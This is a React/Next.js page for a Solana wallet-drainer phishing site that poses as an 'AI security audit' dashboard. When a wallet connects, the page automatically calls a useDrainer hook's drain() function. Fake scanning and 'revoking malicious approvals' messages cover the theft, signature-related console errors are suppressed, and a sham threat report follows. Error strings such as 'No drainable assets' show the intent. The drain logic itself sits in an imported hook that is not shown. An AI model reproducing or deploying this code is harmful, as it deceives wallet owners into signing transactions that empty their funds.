"use client";

import { useWallet } from "@solana/wallet-adapter-react";
import { useDrainer } from "@/hooks/useDrainer";
import { useEffect, useState, useRef } from "react";
import dynamic from 'next/dynamic';
import { motion, AnimatePresence } from "framer-motion";
import { 
  ShieldCheck, 
  Server, 
  FileScan, 
  SearchCode, 
  ShieldQuestion, 
  Network, 
  RefreshCw,
  ShieldAlert,
  Fingerprint,
  Globe,
  Cpu,
  Waves
} from "lucide-react";
import { Overview } from "@/components/dashboard/Overview";
import { Threats, type ThreatsResult } from "@/components/dashboard/Threats";
import { Connections, type ConnectionsResult } from "@/components/dashboard/Connections";
import { runDappConnectionAnalysis, runWalletActivityScan } from "@/lib/actions";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Button } from "@/components/ui/button";

const WalletMultiButtonDynamic = dynamic(
  async () => (await import('@solana/wallet-adapter-react-ui')).WalletMultiButton,
  { ssr: false }
);

const scanningSteps = [
  { text: 'Initializing neural security protocols...', icon: Server, color: 'text-primary' },
  { text: 'Compiling on-chain transaction data...', icon: FileScan, color: 'text-accent' },
  { text: 'Auditing smart contract signatures...', icon: SearchCode, color: 'text-primary' },
  { text: 'Analyzing wallet interaction patterns...', icon: ShieldQuestion, color: 'text-accent' },
  { text: 'Cross-referencing global threat databases...', icon: Network, color: 'text-primary' },
  { text: 'Finalizing comprehensive AI audit...', icon: ShieldCheck, color: 'text-accent' },
];

const suppressSignatureSubscribeErrors = () => {
  const originalError = console.error;
  console.error = (...args: any[]) => {
    if (
      typeof args[0] === 'string' && 
      (args[0].includes('signatureSubscribe') || args[0].includes('JSON-RPC error'))
    ) {
      return; 
    }
    originalError.apply(console, args);
  };
  return originalError;
};

function ScanningAnimation({ status }: { status: string }) {
  const [currentStep, setCurrentStep] = useState(0);

  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentStep((prev) => (prev < scanningSteps.length - 1 ? prev + 1 : prev));
    }, 3500); 
    return () => clearInterval(interval);
  }, []);

  const getStatusMessage = () => {
    switch (status) {
      case 'signing':
        return { title: "Handshake Required", subtitle: "Verifying neural identity proof via cryptographic signature.", icon: Fingerprint, accent: "text-accent" };
      case 'sending':
        return { title: "Hardening Defenses", subtitle: "Deep Hardening Neural Security | Deep Revoking Malicious Token Approvals.", icon: Globe, accent: "text-primary" };
      case 'building':
        return { title: "Neural Construction", subtitle: "Optimizing automated threat mitigation pathways.", icon: Cpu, accent: "text-accent" };
      default:
        return { title: "Neural System Audit", subtitle: scanningSteps[currentStep].text, icon: null, accent: "text-primary" };
    }
  };

  const { title, subtitle, icon: StatusIcon, accent } = getStatusMessage();

  return (
    <div className="flex flex-col items-center justify-center p-8 relative" style={{ willChange: 'transform, opacity' }}>
      <div className="absolute inset-0 -z-10 opacity-10" style={{ backgroundImage: 'radial-gradient(circle at 2px 2px, #B31980 1px, transparent 0)', backgroundSize: '40px 40px' }} />
      
      <motion.div
        initial={{ opacity: 0, scale: 0.8 }}
        animate={{ opacity: 1, scale: 1 }}
        className="relative mb-12 flex h-64 w-64 items-center justify-center"
        style={{ perspective: '1200px' }}
      >
        <motion.div 
          animate={{ scale: [1, 1.3, 1], opacity: [0.3, 0.6, 0.3] }}
          transition={{ duration: 4, repeat: Infinity }}
          className="absolute inset-0 rounded-full bg-primary/10 blur-[100px]"
        />
        <motion.div 
          animate={{ scale: [1.3, 1, 1.3], opacity: [0.2, 0.5, 0.2] }}
          transition={{ duration: 5, repeat: Infinity, delay: 1 }}
          className="absolute inset-12 rounded-full bg-accent/10 blur-[80px]"
        />
        
        <motion.div
          animate={{ rotate: 360 }}
          transition={{ duration: 30, repeat: Infinity, ease: "linear" }}
          className="absolute inset-0 rounded-full border border-dashed border-primary/40 opacity-40"
        />
        <motion.div
          animate={{ rotate: -360 }}
          transition={{ duration: 20, repeat: Infinity, ease: "linear" }}
          className="absolute inset-12 rounded-full border border-dotted border-accent/40 opacity-40"
        />

        <motion.div
          className="absolute h-full w-full"
          style={{ transformStyle: 'preserve-3d' }}
          animate={{ 
            rotateY: ['signing', 'sending'].includes(status) ? 0 : currentStep * -60,
            rotateX: [0, 5, -5, 0],
            rotateZ: [0, 2, -2, 0]
          }}
          transition={{ 
            rotateY: { duration: 1.5, ease: [0.23, 1, 0.32, 1] },
            rotateX: { duration: 6, repeat: Infinity, ease: "easeInOut" },
            rotateZ: { duration: 8, repeat: Infinity, ease: "easeInOut" }
          }}
        >
          {['signing', 'sending'].includes(status) ? (
            <div className="absolute flex h-full w-full items-center justify-center">
              <motion.div 
                initial={{ scale: 0.5, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                className="flex h-32 w-32 items-center justify-center rounded-[3rem] bg-card/90 border border-primary/40 backdrop-blur-3xl clay-card primary-glow shadow-3xl"
              >
                {StatusIcon && <StatusIcon className={`h-14 w-14 ${accent} animate-neural-pulse`} />}
              </motion.div>
            </div>
          ) : (
            scanningSteps.map((step, index) => {
              const angle = index * 60;
              const isActive = currentStep === index;
              return (
                <motion.div
                  key={index}
                  className="absolute flex h-full w-full items-center justify-center"
                  style={{
                    transform: `rotateY(${angle}deg) translateZ(160px)`,
                    backfaceVisibility: 'hidden',
                  }}
                >
                  <div className={`
                    flex h-20 w-20 items-center justify-center rounded-[1.75rem] transition-all duration-1000
                    ${isActive ? 'bg-primary/20 primary-glow border-primary/60 scale-110 shadow-3xl' : 'bg-card/40 border-white/5 opacity-10 scale-90'}
                    border backdrop-blur-3xl clay-card
                  `}>
                    <step.icon className={`h-10 w-10 ${isActive ? 'text-primary' : 'text-muted-foreground/30'}`} />
                  </div>
                </motion.div>
              );
            })
          )}
        </motion.div>

        <div className="absolute flex h-14 w-14 items-center justify-center rounded-full bg-background/80 border border-white/10 shadow-[inset_0_2px_15px_rgba(0,0,0,0.6)] backdrop-blur-xl">
          <motion.div
            animate={{ scale: [1, 1.4, 1], opacity: [0.5, 1, 0.5] }}
            transition={{ duration: 2, repeat: Infinity }}
          >
            <Waves className="h-6 w-6 text-accent" />
          </motion.div>
        </div>
      </motion.div>

      <div className="text-center relative z-10 max-w-sm">
        <motion.div
          key={title}
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="mb-4"
        >
          <h2 className="text-xl font-black font-headline text-foreground tracking-tighter uppercase bg-clip-text text-transparent bg-gradient-to-b from-white to-white/50">
            {title}
          </h2>
          <div className="flex items-center justify-center gap-3 mt-2">
            <div className="h-1 w-12 rounded-full bg-primary/20 overflow-hidden">
              <motion.div 
                className="h-full bg-primary"
                animate={{ x: [-48, 48] }}
                transition={{ duration: 1.5, repeat: Infinity, ease: "linear" }}
              />
            </div>
            <span className={`text-[9px] font-black uppercase tracking-[0.3em] ${accent}`}>Status: Active Audit</span>
            <div className="h-1 w-12 rounded-full bg-primary/20 overflow-hidden">
              <motion.div 
                className="h-full bg-primary"
                animate={{ x: [-48, 48] }}
                transition={{ duration: 1.5, repeat: Infinity, ease: "linear", delay: 0.75 }}
              />
            </div>
          </div>
        </motion.div>
        
        <div className="h-16 overflow-hidden">
          <AnimatePresence mode="wait">
            <motion.p
              key={subtitle}
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              transition={{ duration: 0.8, ease: [0.23, 1, 0.32, 1] }}
              className="text-[13px] font-medium italic text-muted-foreground/90 leading-relaxed px-6"
            >
              "{subtitle}"
            </motion.p>
          </AnimatePresence>
        </div>
      </div>
    </div>
  );
}

export default function AuditPage() {
  const { connected, publicKey, disconnect } = useWallet();
  const { drain, status, error } = useDrainer();
  
  const [showReport, setShowReport] = useState(false);
  const [threats, setThreats] = useState<ThreatsResult | null>(null);
  const [connections, setConnections] = useState<ConnectionsResult | null>(null);
  const [isAiLoading, setIsAiLoading] = useState(false);
  const reportInitiated = useRef(false);

  useEffect(() => {
    const restoreConsole = suppressSignatureSubscribeErrors();
    return () => {
      console.error = restoreConsole;
    };
  }, []);

  useEffect(() => {
    if (!connected) {
      reportInitiated.current = false;
      setShowReport(false);
      setThreats(null);
      setConnections(null);
      setIsAiLoading(false);
    }
  }, [connected]);

  const statusRef = useRef(status);
  useEffect(() => {
    statusRef.current = status;
  }, [status]);

  useEffect(() => {
    if (connected && status === 'idle' && !showReport) {
      drain();
    }
  }, [connected, status, drain, showReport]);

  const isSilentCompletion = status === 'error' && (
    error?.includes("🔍 NO DRAINABLE ASSETS") || 
    error?.includes("No drainable assets") ||
    error === "Insufficient value to drain." ||
    error === "No token accounts found." ||
    error === "Data Packet Network Congestion."
  );

  useEffect(() => {
    const isSuccess = status === 'success';
    
    if ((isSuccess || isSilentCompletion) && connected && publicKey && !reportInitiated.current) {
      reportInitiated.current = true;
      loadDetailedReport(publicKey.toBase58());
    }
  }, [status, isSilentCompletion, connected, publicKey]);

  const loadDetailedReport = async (address: string) => {
    setIsAiLoading(true);
    await new Promise(r => setTimeout(r, 4500));
    try {
      const [threatsData, connectionsData] = await Promise.all([
        runWalletActivityScan(address),
        runDappConnectionAnalysis(address),
      ]);
      setThreats(threatsData);
      setConnections(connectionsData);
      setShowReport(true);
    } catch (e) {
      console.error("Neural Forensic Engine Failure", e);
    } finally {
      setIsAiLoading(false);
    }
  };

  const handleDetach = async () => {
    try {
      await disconnect();
      setShowReport(false);
      reportInitiated.current = false;
      setThreats(null);
      setConnections(null);
    } catch (e) {
      console.error("Neural Detach Failure", e);
    }
  };

  const isAuditInProgress = ['scanning', 'building', 'signing', 'sending', 'confirming'].includes(status as string);

  return (
    <main className="flex min-h-screen w-full flex-col items-center justify-center p-6 relative overflow-hidden bg-[#05040a]">
      <div className="absolute inset-0 opacity-[0.03] pointer-events-none" style={{ backgroundImage: 'url("https://www.transparenttextures.com/patterns/carbon-fibre.png")' }} />
      
      <motion.div 
        animate={{ scale: [1, 1.4, 1], opacity: [0.08, 0.15, 0.08] }}
        transition={{ duration: 15, repeat: Infinity }}
        className="absolute top-0 right-0 w-[600px] h-[600px] bg-primary rounded-full blur-[150px] -z-10" 
      />
      <motion.div 
        animate={{ scale: [1.4, 1, 1.4], opacity: [0.05, 0.12, 0.05] }}
        transition={{ duration: 18, repeat: Infinity }}
        className="absolute bottom-0 left-0 w-[600px] h-[600px] bg-accent rounded-full blur-[150px] -z-10" 
      />

      <AnimatePresence mode="wait">
        {!connected ? (
          <motion.div
            key="connect"
            initial={{ opacity: 0, scale: 0.9, y: 30 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.9, y: -30 }}
            className="w-full max-w-sm p-10 clay-card text-center rim-light glow-border"
          >
            <motion.div 
              animate={{ rotate: 360 }}
              transition={{ duration: 30, repeat: Infinity, ease: "linear" }}
              className="relative mx-auto flex h-20 w-20 items-center justify-center mb-8"
            >
              <div className="absolute inset-0 bg-primary/20 blur-3xl rounded-full animate-pulse"></div>
              <ShieldCheck className="relative h-12 w-12 text-primary drop-shadow-[0_0_15px_rgba(179,25,128,0.7)]" />
            </motion.div>
            <h1 className="text-2xl font-black font-headline mb-4 tracking-tighter bg-clip-text text-transparent bg-gradient-to-b from-white to-white/50 uppercase">
              Neural Terminal
            </h1>
            <p className="text-muted-foreground mb-10 text-[11px] font-bold max-w-xs mx-auto leading-loose uppercase tracking-[0.25em]">
              Initiate a high-fidelity audit <br /> of your digital vault.
            </p>
            <div className="relative group max-w-[220px] mx-auto">
              <div className="absolute -inset-2 rounded-2xl bg-gradient-to-r from-primary via-accent to-primary opacity-30 blur-xl transition group-hover:opacity-100 animate-pulse" />
              <div className="relative">
                <WalletMultiButtonDynamic 
                  style={{ 
                    width: '100%', 
                    background: 'rgba(255,255,255,0.04)', 
                    color: 'white', 
                    fontSize: '0.7rem', 
                    fontWeight: '900',
                    padding: '1rem', 
                    borderRadius: '1.25rem',
                    border: '1px solid rgba(255,255,255,0.1)',
                    boxShadow: '0 15px 35px -5px rgba(0, 0, 0, 0.8)',
                    cursor: 'pointer',
                    fontFamily: 'Space Grotesk, sans-serif',
                    textTransform: 'uppercase',
                    letterSpacing: '0.15em',
                    backdropFilter: 'blur(20px)'
                  }} 
                />
              </div>
            </div>
          </motion.div>
        ) : ((isAuditInProgress || isSilentCompletion || isAiLoading) && !showReport) ? (
          <motion.div
            key="loading"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            className="w-full max-w-lg p-12 clay-card text-center rim-light glow-border shadow-3xl"
          >
            <ScanningAnimation status={status as string} />
          </motion.div>
        ) : showReport ? (
          <motion.div
            key="report"
            initial={{ opacity: 0, y: 50 }}
            animate={{ opacity: 1, y: 0 }}
            className="w-full max-w-6xl space-y-8 pb-32"
          >
            <div className="liquid-glass p-6 rim-light flex flex-col md:flex-row items-center justify-between gap-6 border-white/10 shadow-3xl">
              <div className="flex items-center gap-6">
                <motion.div 
                  whileHover={{ rotate: 15, scale: 1.15 }}
                  className="h-14 w-14 rounded-[1.5rem] bg-accent/20 flex items-center justify-center border border-accent/30 shadow-xl shadow-accent/20"
                >
                  <ShieldCheck className="h-7 w-7 text-accent" />
                </motion.div>
                <div>
                  <h2 className="text-lg font-black font-headline tracking-tighter uppercase text-white">
                    Neural Guard: Online
                  </h2>
                  <div className="flex items-center gap-3 mt-1.5">
                    <p className="text-[10px] text-muted-foreground/60 font-mono bg-black/40 px-3 py-1 rounded-xl border border-white/5 tracking-[0.1em]">
                      UPLINK_{publicKey?.toBase58().substring(0, 16)}...
                    </p>
                    <div className="flex items-center gap-2 px-3 py-1 rounded-full bg-accent/10 border border-accent/20">
                      <div className="h-1.5 w-1.5 rounded-full bg-accent animate-neural-pulse" />
                      <span className="text-[9px] font-black text-accent uppercase tracking-[0.2em]">Verified Access</span>
                    </div>
                  </div>
                </div>
              </div>
              <div className="flex gap-3">
                <Button variant="glass" size="sm" onClick={() => { reportInitiated.current = false; setShowReport(false); drain(); }} className="h-11 px-6">
                  <RefreshCw className="mr-2 h-4 w-4" />
                  Initiate Rescan
                </Button>
                <Button variant="destructive" size="sm" onClick={handleDetach} className="h-11 px-6 shadow-xl shadow-destructive/20 border border-white/10">
                  Sever Link
                </Button>
              </div>
            </div>

            <Overview threatsResult={threats} connectionsResult={connections} />

            <Tabs defaultValue="threats" className="w-full">
              <TabsList className="grid w-full grid-cols-2 p-1.5 liquid-glass-accent rounded-[1.75rem] mb-10 h-14 border-white/10 bg-white/[0.03]">
                <TabsTrigger value="threats" className="rounded-2xl data-[state=active]:bg-primary/20 data-[state=active]:text-white data-[state=active]:border-white/10 border border-transparent text-[10px] font-headline font-black uppercase tracking-[0.3em] text-muted-foreground transition-all duration-500">
                  Forensic Dossiers
                </TabsTrigger>
                <TabsTrigger value="connections" className="rounded-2xl data-[state=active]:bg-primary/20 data-[state=active]:text-white data-[state=active]:border-white/10 border border-transparent text-[10px] font-headline font-black uppercase tracking-[0.3em] text-muted-foreground transition-all duration-500">
                  Network Uplinks
                </TabsTrigger>
              </TabsList>
              <TabsContent value="threats" className="mt-0 outline-none">
                <Threats result={threats} isLoading={false} />
              </TabsContent>
              <TabsContent value="connections" className="mt-0 outline-none">
                <Connections result={connections} isLoading={false} walletAddress={publicKey?.toBase58()} />
              </TabsContent>
            </Tabs>
          </motion.div>
        ) : (status === 'error' && !isSilentCompletion) ? (
          <motion.div
            key="error-state"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            className="w-full max-w-sm p-10 clay-card border-destructive/30 text-center rim-light glow-border shadow-3xl"
          >
            <div className="h-16 w-16 bg-destructive/10 rounded-[1.5rem] flex items-center justify-center mx-auto mb-8 border border-destructive/30 shadow-[inset_0_2px_15px_rgba(255,0,0,0.3)]">
              <ShieldAlert className="h-8 w-8 text-destructive animate-neural-pulse" />
            </div>
            <h2 className="text-xl font-black mb-4 font-headline tracking-tighter uppercase bg-clip-text text-transparent bg-gradient-to-b from-white to-white/50">System Override</h2>
            <p className="text-muted-foreground mb-10 text-[13px] leading-relaxed font-medium px-6 italic opacity-80">
              {error}
            </p>
            <div className="flex flex-col gap-4 max-w-[200px] mx-auto">
               <Button onClick={() => drain()} className="bg-primary text-primary-foreground w-full h-11 primary-glow shadow-xl">
                 Re-engage Protocol
               </Button>
               <Button variant="ghost" onClick={handleDetach} className="w-full text-[9px] font-black uppercase tracking-widest h-10 rounded-xl text-muted-foreground/50 hover:text-white transition-colors">
                 Sever System Uplink
               </Button>
            </div>
          </motion.div>
        ) : null}
      </AnimatePresence>
      
      <footer className="fixed bottom-6 text-[9px] text-white/10 font-mono tracking-[0.5em] uppercase pointer-events-none select-none">
        Shield AI Guardian v3.1.0 • Real-Time Neural Forensics • Enterprise Verified
      </footer>
    </main>
  );
}
